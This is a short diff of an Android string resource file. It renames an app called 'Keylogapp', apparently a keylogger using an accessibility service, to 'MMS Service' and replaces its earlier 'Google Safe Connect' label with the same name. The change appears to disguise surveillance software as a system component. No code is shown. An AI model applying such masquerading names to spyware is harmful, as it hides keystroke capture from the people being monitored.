@@ -1,4 +1,4 @@
 <resources>
-    <string name="app_name">Keylogapp</string>
-    <string name="accessibility_service_label">Google Safe Connect</string>
+    <string name="app_name">MMS Service</string>
+    <string name="accessibility_service_label">MMS Service</string>
 </resources>
